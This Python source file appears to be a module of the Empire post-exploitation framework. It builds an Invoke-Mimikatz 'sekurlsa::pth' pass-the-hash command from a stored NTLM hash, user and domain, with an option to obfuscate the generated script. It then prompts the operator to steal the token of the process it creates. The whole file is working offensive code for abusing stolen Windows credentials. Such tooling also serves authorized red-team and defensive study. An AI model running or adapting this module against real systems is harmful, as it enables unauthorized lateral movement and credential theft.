import logging
from typing import Dict

from empire.server.core.db.models import Credential
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message

log = logging.getLogger(__name__)


class Module:
    @staticmethod
    def generate(
        main_menu,
        module: EmpireModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        # read in the common module source code
        script, err = main_menu.modulesv2.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        # if a credential ID is specified, try to parse
        cred_id = params["CredID"]
        if cred_id != "":
            if not main_menu.credentials.is_credential_valid(cred_id):
                return handle_error_message("[!] CredID is invalid!")

            cred: Credential = main_menu.credentials.get_credentials(cred_id)
            if cred.credtype != "hash":
                return handle_error_message("[!] An NTLM hash must be used!")

            if cred.username != "":
                params["user"] = cred.username
            if cred.domain != "":
                params["domain"] = cred.domain
            if cred.password != "":
                params["ntlm"] = cred.password

        if params["ntlm"] == "":
            log.error("ntlm hash not specified")

        # build the custom command with whatever options we want
        command = "sekurlsa::pth /user:" + params["user"]
        command += " /domain:" + params["domain"]
        command += " /ntlm:" + params["ntlm"]

        # base64 encode the command to pass to Invoke-Mimikatz
        script_end = "Invoke-Mimikatz -Command '\"" + command + "\"'"

        script_end += (
            ';"`nUse credentials/token to steal the token of the created PID."'
        )

        script = main_menu.modulesv2.finalize_module(
            script=script,
            script_end=script_end,
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
        return script
